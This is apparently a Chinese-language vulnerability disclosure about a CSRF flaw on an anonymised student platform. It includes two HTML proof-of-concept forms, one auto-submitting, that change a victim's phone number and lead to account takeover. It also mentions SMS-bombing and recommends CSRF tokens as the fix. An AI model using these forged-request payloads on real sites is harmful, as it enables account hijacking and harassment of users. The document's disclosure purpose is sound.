---
title: XXX平台存在CSRF漏洞导致篡改手机号
slug: 0087
---
# **XXX平台存在CSRF漏洞导致篡改手机号**

**1.漏洞详情**

**在对XXX进行安全测试时，发现其平台存在 CSRF 漏洞，可执行多项敏感操作（包括篡改手机号，短信验证码轰炸，修改密码邮箱等）**



**2.漏洞证明**

**登录平台之后，模拟点击钓鱼链接test.com/poc1.html(发送新的手机验证码 poc)**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779770400304-400b36dc-4016-4c09-acce-9e1739169f4a.png)**

```
poc1:

<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

​    <form action="https://XXX/student/userInfo/sendValidateCode" method="POST">

​      <input type="hidden" name="mobile" value="yourphone" />

​      <input type="submit" value="Submit request" />

​    </form>

    <script>

​      history.pushState('', '', '/');

​      document.forms[0].submit();

​    </script>

  </body>

</html>
```

**成功执行**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779770442683-c21dedff-f6f6-4f39-820d-7331d07ebb0b.png)**

**把收到的验证码输入 test.com/poc2.html(模拟自动化输入验证码篡改手机号)**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779770467422-86ceab61-6358-4f73-bce1-ef8c2d97f142.png)**

**submit 之后，来看个人页面**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779770494727-7256493d-dba7-49dd-a4e0-3e39298037c1.png)**

**刷新，成功篡改手机号**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779770513534-d8f59bec-c2d7-402f-b7fa-b11f4620f819.png)**

```
poc2:

<html>

  <body>

​    <form action="https://XXX/student/userInfo/setMobile" method="POST">

​      <label for="mobile">手机号：</label>

​      <input type="text" id="mobile" name="mobile" value="yourphone" required />

​      <br><br>

​      <label for="validateCode">验证码：</label>

​      <input type="text" id="validateCode" name="validateCode" required />

​      <br><br>

​      <input type="submit" value="提交请求" />

​    </form>

  </body>

</html>
```



**修改手机号之后，可以去登录界面去修改受害人的密码**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779770542219-37f8534c-e06d-4d2f-bb83-38ab6fa59ee0.png)**

**进而登录受害人账号**



**由于本站还存在验证码轰炸漏洞，可以添加脚本对任意手机号进行无限短信轰炸**

**![img](https://cdn.nlark.com/yuque/0/2025/png/60657001/1766501111570-fb7d91b7-9cbe-4fff-9132-37685ec1243e.png)**



**同理还可以 CSRF 对邮箱，密码等进行修改，危害大**



**3.修复方案**

**添加 CSRF Token 验证**
